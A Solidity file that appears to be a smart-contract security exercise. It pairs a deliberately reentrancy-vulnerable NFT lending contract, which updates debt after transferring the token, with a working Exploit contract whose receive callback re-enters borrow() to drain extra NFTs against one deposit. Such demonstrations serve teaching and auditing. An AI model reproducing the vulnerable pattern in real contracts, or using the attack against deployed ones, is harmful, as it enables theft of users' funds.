pragma solidity 0.8.19;

import "@openzeppelin/contracts/token/ERC721/IERC721.sol";
import "./ValuableNFT.sol";

contract ILenderNFT {
    ValuableNFT public nft;
    uint256 public constant NFT_VALUE = 1 ether;
    mapping(address => uint256) public balance;
    mapping(address => uint256) public debt;

    constructor() {
        nft = new ValuableNFT();
    }

    function deposit() external payable {
        balance[msg.sender] += msg.value;
    }

    function withdraw(uint256 amount) external {
        require(debt[msg.sender] <= balance[msg.sender] - amount, "not enough collateral");
        balance[msg.sender] -= amount;
        payable(msg.sender).transfer(amount);
    }

    function borrow(uint256 tokenId) external {
        require(
            balance[msg.sender] > 0 &&
            debt[msg.sender] + NFT_VALUE <= balance[msg.sender], "not enough collateral"
        );

        nft.safeTransferFrom(address(this), msg.sender, tokenId);
        debt[msg.sender] += NFT_VALUE;
    }

    function repay(uint256 tokenId) external payable {
        require(debt[msg.sender] > 0, "no debt");
        nft.safeTransferFrom(msg.sender, address(this), tokenId);
        debt[msg.sender] -= NFT_VALUE;
    }

     function onERC721Received(
         address operator,
         address from,
         uint256 id,
         bytes calldata data
     ) external returns (bytes4)  {
         return this.onERC721Received.selector;
     }
}



contract Exploit is IERC721Receiver {
    ILenderNFT lenderNFT;
    IERC721 nft;
    uint256 num = 0;

    constructor(address lenderNFTAddress) payable {
        lenderNFT = ILenderNFT(lenderNFTAddress);
        nft = IERC721(lenderNFT.nft());
    }

    function attack() external {
        lenderNFT.deposit{value: 1 ether}();
        lenderNFT.borrow(1);
    }
    
    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external override returns (bytes4) {
        while(num < 9){
            num++;
            lenderNFT.borrow(num+1);
        }        
        return IERC721Receiver.onERC721Received.selector;
    }
}